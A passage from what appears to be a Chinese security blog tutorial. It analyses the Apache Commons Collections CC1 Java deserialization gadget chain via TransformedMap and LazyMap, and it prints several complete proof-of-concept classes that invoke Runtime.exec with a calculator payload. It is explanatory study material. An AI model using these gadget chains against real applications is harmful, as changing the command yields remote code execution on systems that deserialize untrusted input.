org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的代码分析，我们已经搞明白了命令执行的原理，把一个集合放入TransformedMap.decorate，且参数里面传入我们精心构造的transformerChain，最终通过outerMap.put的方法去触发回调，达到执行transformerChain里的一系列回调，最终执行我们定义的代码。</p><p>以上构造都是在本地运行，那么在反序列化中，我们该以什么样的思路去构造POC呢？</p><p>回想本地的POC，我们是outerMap.put触发transform回调，那么反序列化，我们就要寻找一个类其里面的readObject方法里面存在某个方法可以触发到transform回调。</p><p>这个类就是</p><blockquote><p>sun.reflect.annotation.AnnotationInvocationHandler</p></blockquote><p>AnnotationInvocationHandler.readObject里触发回调的方法就是</p><blockquote><p>var5.setValue</p></blockquote><p><img src="/assets/image-20230501134726-uzz8kw3.png" alt="image.png"></p><p>所以可以构造如下POC去进行调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                    <span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">            transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">            Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">            Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先不用去管为什么这样去构造POC，先去看看反序列化里面的逻辑，然后再回头来看为什么要这样去构造POC。在如下位置打上断点，进行调试程序。</p><p><img src="/assets/image-20230501144212-v7v0agp.png" alt="image.png"></p><p>程序已经成功走到断点处</p><p><img src="/assets/image-20230501144240-lwvoopq.png" alt="image.png"></p><p>一步一步走一下看看，首先拿到我们的反序列化流</p><p><img src="/assets/image-20230501144419-fg900h3.png" alt="image.png"></p><p>这里获取传过来的注解</p><p><img src="/assets/image-20230501144730-1v8b2jv.png" alt="image.png"></p><p>遍历var4里面的元素赋值给var5，而var4是this.memberValues.entrySet().iterator()获取的迭代器，this.memberValues其实就是我们反射构造器里传进来的outerMap</p><p><img src="/assets/image-20230501145027-jn3v740.png" alt="image.png"></p><p>那最后直接条跳到最后一个断点</p><p><img src="/assets/image-20230501145404-tqtaae8.png" alt="image.png"></p><p><img src="/assets/image-20230501145918-556mqeg.png" alt="image.png"></p><p>跟进这个对象的setValue方法</p><p><img src="/assets/image-20230501150820-tg9itty.png" alt="image.png"></p><p>调用了this.parent.checkSetValue，而这里this.parent就是我们熟悉的TransformedMap，再往里面跟一步</p><p><img src="/assets/image-20230501151008-ky9mboi.png" alt="image.png"></p><p>transform回调就在这里被执行了，直接让程序走到最后，发现执行命令成功弹出了计算机</p><p><img src="/assets/image-20230501151138-zpddhlx.png" alt="image.png"></p><p>链子是通了，但是为什么要用如下的方式去构造POC呢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                    <span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">            transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">            Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">            Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比最终的反序列化POC和最初的如下一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现最大的区别就是获取Runtime这个对象的方式不同了</p><p>最初获取方式如下</p><p><img src="/assets/image-20230501151958-rblx5ue.png" alt="image.png"></p><p>最终POC获取方式如下</p><p><img src="/assets/image-20230501152041-ip7t18o.png" alt="image.png"></p><p>这是因为Runtime这个类是没有实现Serializable接口的，直接通过最初的Runtime.getRuntime()方式获取对象，在序列化过程中会报错，导致得不到流。</p><p>还一个问题为什么用Retention.class注解</p><p><img src="/assets/image-20230501152721-vczu7z7.png" alt="image.png"></p><p>这是因为AnnotationInvocationHandler里逻辑里有个如下判断</p><p><img src="/assets/image-20230501152927-n3afm7m.png" alt="image.png"></p><p>而让程序这个if条件为真的条件就是</p><blockquote><ol><li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是<br> Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li><li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li></ol></blockquote><p>这也是为什么使用Retention的原因</p><p><img src="/assets/image-20230501153111-st2uims.png" alt="image.png"></p><p>当然这种注解不止是Retention，也可以用其他满足条件的注解替换。</p><h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>LazyMap这个类也是ysoserial这款工具里CC1使用的类，LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。</p><p>先上POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">            Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">            Map.class);</span><br><span class="line"></span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)</span><br><span class="line">            Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第一处与TransformedMap利用链不同的地方就是在42行使用了LazyMap.decorate方法，跟进看看</p><p><img src="/assets/image-20230502104702-s8tgwr1.png" alt="image.png"></p><p>把我们构造好的transformerChain，传递给了factory，那怎么让它去调用factory里的回调函数transform呢，这要看LazyMap里的get方法了。</p><p><img src="/assets/image-20230502104916-g2diikv.png" alt="image.png"></p><p>里面的逻辑是当get过来的值找不到时，就会调用factory.transform，所以我们还是要去寻找一个类，这个类里存在调用get这个方法。当然LazyMap这条链还是利用了sun.reflect.annotation.AnnotationInvocationHandler，但是AnnotationInvocationHandler这个类的readObject方法里面没有直接去调用get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title 